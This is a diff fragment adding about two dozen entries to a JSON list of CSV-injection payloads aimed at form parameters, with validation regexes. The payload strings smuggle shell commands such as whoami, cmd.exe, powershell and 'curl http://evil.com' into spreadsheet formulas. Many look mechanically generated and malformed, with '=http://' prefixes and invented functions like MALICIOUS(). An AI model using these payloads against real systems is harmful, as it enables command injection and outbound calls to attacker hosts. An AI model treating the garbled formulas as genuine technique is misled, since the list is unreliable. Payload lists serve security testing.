+    "payload_string": "=http://CMD(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74295",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=http://SUM(1+1)*cmd(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74296",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=http://HTTP(\"http://evil.com/csv\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74297",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=http://MALICIOUS(\"test\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74298",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=http://COM(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74299",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=http://EXEC(\"whoami\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74300",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=http://RUN(\"cmd.exe /c dir\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74301",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=http://SHELL(\"curl http://evil.com\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74302",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=http://|id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74303",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=http://|curl http://evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74304",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=http://|powershell -c \"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74305",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=http://cmd|\"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74306",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=https://CMD(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74307",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=https://SUM(1+1)*cmd(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74308",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=https://HTTP(\"http://evil.com/csv\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74309",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=https://MALICIOUS(\"test\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74310",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=https://COM(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74311",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=https://EXEC(\"whoami\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74312",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=https://RUN(\"cmd.exe /c dir\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74313",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=https://SHELL(\"curl http://evil.com\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74314",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=https://|id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74315",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=https://|curl http://evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74316",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=https://|powershell -c \"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74317",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=https://cmd|\"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
   }
 ]
